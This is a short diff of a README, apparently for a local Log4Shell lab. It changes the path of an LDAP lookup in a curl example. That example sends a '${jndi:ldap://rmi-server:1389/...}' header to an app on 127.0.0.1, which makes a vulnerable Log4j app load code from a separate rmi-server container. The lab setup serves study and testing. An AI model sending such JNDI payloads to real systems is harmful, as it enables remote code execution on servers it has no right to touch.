@@ -22,7 +22,7 @@ To get the ldap payload, please see the log of the container `rmi-server`.
 and make a request, e.g.
 
 ```bash
-curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://rmi-server:1389/v1hehl}'
+curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://rmi-server:1389/7mqfuh}'
 ```
 
 5. Check the result, go to the console of the app.
